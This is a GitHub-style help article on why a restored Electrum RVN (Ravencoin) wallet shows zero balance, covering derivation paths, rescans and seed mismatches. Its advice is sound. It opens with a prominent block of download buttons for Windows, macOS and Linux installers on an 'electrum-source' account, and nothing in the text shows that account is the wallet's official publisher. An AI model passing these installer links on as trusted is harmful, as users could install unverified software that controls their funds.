![Electrum RVN](assets/banner-article.png)

# Zero Balance After Restoring Electrum RVN

<!-- compact-download-block -->

<p align="center">Why a restored wallet can look empty at first</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A restored wallet showing zero is almost always the derivation path. The seed can derive addresses along more than one path, and if the restore picked a different one, you have a valid wallet that simply is not looking where the funds are. The wallet offers an alternate Ravencoin path for exactly this case: switch it, rescan, and the balance usually appears.

## Why a correct seed can show nothing

A seed is not a wallet; it is the input to a key-derivation function. That function takes a path - a short string of numbers - and produces a tree of keys. Change the path and you get a different, equally valid tree. Both are "your seed"; only one of them holds your history.

Three ways to end up on the wrong tree:

1. **A different wallet wrote the original.** Another client may have used a path this wallet does not default to.
2. **The restore defaulted to the current convention**, while the original wallet was created under an older one.
3. **The wallet was restored as a different kind of wallet** - watch-only or hardware - and picked its own default.

None of these loses funds. All of them look identical: a wallet that opens, connects and reports zero.

## The fix, in order

**1. Switch the derivation path.** In the wallet's wallet-information screen, choose the alternate Ravencoin path, then let it rescan. This is the single most common fix and the site's own troubleshooting names it.

**2. Rescan the chain.** If the path is right, force a rescan so the wallet re-queries its addresses rather than trusting a cached view.

**3. Check the connection.** A wallet that is not connected shows what it last knew, which after a fresh restore is nothing - [Electrum RVN will not connect to a server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md).

**4. Confirm the phrase.** Compare the paper against what you typed, word by word. A valid phrase from a different wallet produces a valid empty wallet, and only you can tell the difference.

**5. Give the rescan time.** A wallet with a long history takes longer than a fresh one.

If all five fail, the phrase you have does not control the addresses you expect. That is a fact to establish calmly, not a reason to start trying variations of the words - a checksum will reject almost all of them, and the rest are other people's wallets.

## The wrong-seed case, plainly

A seed restores only what was derived from it. If the funds were received at addresses from a different seed - a second wallet you created and forgot, a wallet on another device, a wallet whose paper you are holding - no amount of rescanning will find them.

The way to tell: restore the *other* seed you have and see which one shows the balance. If you have only one paper and it shows nothing, the balance may still exist on a wallet file you have not deleted - [where Electrum RVN stores your wallet](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) is how to look for it.

## What a rescan actually does

The wallet derives a batch of addresses from the seed, asks servers for their history, and repeats as it finds used addresses. That is why a restore of an old, busy wallet is slower than a new one, and why a wallet can appear to "find" funds gradually rather than all at once.

It also explains a subtler case: an address used once, long ago, beyond the batch the wallet scanned, can be missed until the scan extends far enough. The fix is the same - rescan, and let it finish.

## When it is not the derivation path

Three other causes worth ruling out:

**A watch-only wallet.** It has addresses and no keys; a restore of a seed into a watch-only wallet would not produce spending ability. [Watch-only wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md).

**A testnet wallet.** Testnet addresses are a different network; a wallet switched to testnet shows nothing of mainnet history.

**A different coin's seed.** A phrase from another chain derives valid addresses on that chain, not this one - [is Electrum RVN a Bitcoin wallet?](https://github.com/electrum-source/download-and-setup/blob/main/is-electrum-rvn-a-bitcoin-wallet.md).

## Recovering your confidence, not just the balance

Once the balance is back, do two things: write down which derivation path this wallet uses, on the same paper as the seed, and restore once more into a throwaway wallet to confirm the fix is repeatable. A restore that worked by accident is not a procedure.

Then retire the old file deliberately, if you are migrating - [moving Electrum RVN to another computer](https://github.com/electrum-source/passphrase-backup/blob/main/moving-electrum-rvn-to-another-computer.md) - and keep the seed where it was: offline, on paper, away from the machine.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Path handling and rescan behaviour are the sort of thing that improves between releases, so [updating to the latest release](https://github.com/electrum-source/download-and-setup/blob/main/update-electrum-rvn-to-the-latest-release.md) is a reasonable step before a long debugging session. [Restore a wallet from an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) covers the restore itself, and [forgot your Electrum RVN password?](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md) is the adjacent problem where the seed is the answer again.

## FAQ

### Is my money gone if the restored wallet shows zero?

Almost certainly not. A zero balance after a restore is usually a derivation-path mismatch, and the funds are still at addresses derived from the same seed.

### What is a derivation path?

A short numbered path that tells the wallet which branch of keys to derive from the seed. Different paths produce different, valid address sets from the same words.

### How do I switch it?

In the wallet information screen, choose the alternate Ravencoin path, then rescan. The wallet re-queries the addresses it now derives.

### Why did it work on my old computer and not the new one?

Because the old wallet file stored the path it was using, and a fresh restore starts from the current default. The file remembers; the seed alone does not.

### Can I try different words until the balance appears?

No. Guessing variations is futile and dangerous, and a wrong phrase is someone else's wallet. Check the path, the connection and the phrase you actually have.

<!-- related-articles -->

## Related articles

- [Electrum RVN Will Not Connect to a Server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md)
- [Where Electrum RVN Stores Your Wallet File](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md)
- [Watch-Only Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md)
- [Is Electrum RVN a Bitcoin Wallet? What It Actually Runs On](https://github.com/electrum-source/download-and-setup/blob/main/is-electrum-rvn-a-bitcoin-wallet.md)
